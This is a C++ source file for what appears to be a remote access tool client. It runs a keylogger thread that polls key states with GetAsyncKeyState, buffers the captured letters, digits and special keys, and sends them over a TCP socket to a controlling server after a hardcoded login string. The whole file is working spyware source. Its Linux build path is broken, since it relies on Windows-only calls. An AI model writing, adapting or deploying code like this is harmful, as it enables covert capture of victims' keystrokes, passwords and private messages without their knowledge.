/*
* @Author: amaneureka
* @Date:   2017-04-02 03:33:49
* @Last Modified by:   amaneureka
* @Last Modified time: 2017-04-02 19:50:29
*/

#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <pthread.h>

using namespace std;

#if __WIN__

    /* g++ -std=c++11 iirat.cpp -D__WIN__ -lws2_32 */

    /* supporting win 7 or later only */
    #define WINVER _WIN32_WINNT_WIN7
    #define _WIN32_WINNT _WIN32_WINNT_WIN7

    #include <windows.h>
    #include <winsock2.h>
    #include <w32api/ws2tcpip.h>

    /* simple POSIX to windows translation */
    #define read(soc, buf, len) recv(soc, buf, len, MSG_OOB)
    #define write(soc, buf, len) send(soc, buf, len, MSG_OOB)

#elif __LINUX__

    /* g++ -std=c++11 iirat.cpp -D__LINUX__ */

    #include <unistd.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
    #include <netinet/in.h>

#else

    "You forget to define platform"

#endif

/* concerned special keycodes */
char keycodes[] =
{
    VK_LBUTTON,
    VK_RBUTTON,
    VK_MBUTTON,
    VK_BACK,
    VK_TAB,
    VK_RETURN,
    VK_SHIFT,
    VK_CONTROL,
    VK_MENU,
    VK_CAPITAL,
    VK_ESCAPE,
    VK_SPACE,
    VK_PRIOR,
    VK_PRIOR,
    VK_HOME,
    VK_LEFT,
    VK_UP,
    VK_RIGHT,
    VK_DOWN,
    VK_SNAPSHOT,
    VK_INSERT,
    VK_DELETE,

    VK_NUMPAD0,
    VK_NUMPAD1,
    VK_NUMPAD2,
    VK_NUMPAD3,
    VK_NUMPAD4,
    VK_NUMPAD5,
    VK_NUMPAD6,
    VK_NUMPAD7,
    VK_NUMPAD8,
    VK_NUMPAD9,

    VK_MULTIPLY,
    VK_ADD,
    VK_SEPARATOR,
    VK_SUBTRACT,
    VK_DECIMAL,
    VK_DIVIDE
};

void *keylogger(void *args)
{
    int i, index = 3;
    int sock = *(int*)args;

    char buffer[100] = "SAV";
    while(true)
    {
        // maximum of 3 entries can be made in a single loop so 1020
        if (index >= 90)
        {
            /* send data */
            write(sock, buffer, index);

            /* reset buffer */
            index = 3;
        }

        for (int i = 0; i < sizeof(keycodes); i++)
        {
            /* get special key's status */
            if (GetAsyncKeyState(keycodes[i]))
                buffer[index++] = i;
        }

        for (int i = 0x41; i < 0x5B; i++)
        {
            /* get alphabets */
            if (GetAsyncKeyState(i))
                buffer[index++] = i;
        }

        for (int i = 0x30; i < 0x3A; i++)
        {
            /* get numeric keys */
            if (GetAsyncKeyState(i))
                buffer[index++] = i;
        }

        Sleep(100);
    }
}

int main(int argc, char *argv[])
{
    size_t size;
    int sock, len;
    char *line = NULL;
    char buffer[4096];
    struct sockaddr_in addr;
    fd_set active_fd_set, read_fd_set;

    pthread_t keylogger_thread;

    #if __WIN__

        WSADATA wsa;

        /* windows socket needs initialization */
        if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
        {
            printf("initialization failed\n");
            exit(0);
        }

    #endif

    /* create socket */
    sock = socket(AF_INET , SOCK_STREAM , 0);
    if (sock < 0)
    {
        printf("could not create socket\n");
        exit(0);
    }

    /* configurations */
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9009);

    if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) <= 0)
    {
        printf("address resolve failed\n");
        exit(0);
    }

    /* try to connect */
    if (connect(sock, (struct sockaddr *)&addr , sizeof(addr)) < 0)
    {
        printf("Unable to connect\n");
        exit(0);
    }

    printf("Server Connected :)\n");

    /* add client and stdin to read list */
    FD_ZERO(&active_fd_set);
    FD_SET(sock, &active_fd_set);
    //FD_SET(0, &active_fd_set);

    /* start background tasks */
    pthread_create(&keylogger_thread, NULL, &keylogger, &sock);

    /* basic login */
    write(sock, "LOGf466d02d-ae68-458b-87e1-e86c6e367f16", 40);

    while(true)
    {
        read_fd_set = active_fd_set;

        if (select(FD_SETSIZE, &read_fd_set, NULL, NULL, NULL) < 0)
        {
            printf("select error\n");
            exit(0);
        }

        for (int i = 0; i < FD_SETSIZE; i++)
        {
            if (FD_ISSET(i, &read_fd_set))
            {
                if (i == sock)
                {
                    if (read(sock, buffer, sizeof(buffer)) <= 0)
                    {
                        printf("\ndisconnected from the server\n");
                        exit(0);
                    }

                    printf("%s", buffer);
                    fflush(stdout);
                }
                else
                {
                    if ((len = getline(&line, &size, stdin)) <= 0)
                        continue;
                    line[len - 1] = '\0';

                    write(sock, line, len - 1);
                }
            }
        }
    }

    return 0;
}
